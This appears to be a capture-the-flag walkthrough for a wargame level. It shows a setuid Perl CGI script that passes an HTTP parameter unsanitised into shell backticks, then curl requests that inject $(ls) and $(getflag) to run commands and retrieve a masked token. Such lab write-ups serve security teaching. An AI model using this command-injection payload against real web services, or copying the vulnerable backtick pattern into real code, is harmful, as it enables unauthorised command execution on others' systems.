# Level04

## Exploring the comnputer

```bash 
$ ls -la
total 16
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```

```bash 
$ file level04.pl 
level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
```

So we have a perl script 

## Learning more about Perl

Perl is a high-level, general-purpose programming language known for its strengths in text processing. It was originally developed for report generation and system administration tasks on Unix systems. Today, it's used for scripting, web development, and automating various tasks, especially those involving regular expressions and data parsing.

## Testing

```bash 
$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The program is a CGI script in Perl (served by a web server on port 4747) that retrieves a parameter x from an HTTP request, executes a shell command with this value, and returns the result or any errors as HTML content.

```bash 
$ curl -I http://localhost:4747
HTTP/1.1 200 OK
Date: Thu, 15 May 2025 08:29:20 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html

```

```bash 
$ curl  http://localhost:4747?x=salut
salut
```

## Finding the vulnerability

We know that we pass an argument to a function without checking it, let's try to pass a shell command.


```bash 
$ curl 'http://localhost:4747?x=$(ls)'
level04.pl
```

## Getting the flag 

It works ! Let's try with getflag then :

```bash 
$ curl 'http://localhost:4747?x=$(getflag)'
Check flag.Here is your token : ******************
```







